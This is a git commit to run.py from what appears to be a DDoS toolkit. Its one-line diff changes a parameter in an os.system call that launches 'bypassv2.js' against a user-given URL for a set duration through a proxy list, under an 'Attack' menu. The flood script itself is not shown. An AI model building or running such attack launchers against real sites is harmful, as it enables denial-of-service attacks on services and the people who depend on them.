9b0707f9635da5aca7aa145c1bff3c2b0ce6afe8
CodeSyntax{×_×} <rayudmakise@gmail.com>
2024-12-30 21:56:10 +0700

    Update run.py

--- run.py
+++ run.py
@@ -431,7 +431,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node bypassv2.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node bypassv2.js {url} {duration} 64 3 proxy.txt')
                     
             except ValueError:
                 main()
